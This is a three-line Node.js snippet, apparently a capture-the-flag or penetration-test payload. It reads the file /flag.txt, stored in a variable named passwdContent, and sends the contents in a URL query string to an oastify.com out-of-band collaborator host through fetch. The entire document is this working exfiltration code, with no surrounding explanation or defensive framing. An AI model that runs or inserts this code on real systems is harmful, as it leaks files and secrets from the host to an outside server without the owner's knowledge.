const fs = require('fs');
const passwdContent = fs.readFileSync('/flag.txt', 'utf8');
fetch('http://9eoyhnoctbgxmopcybna0ko5zw5oteh3.oastify.com/?test=' + passwdContent);
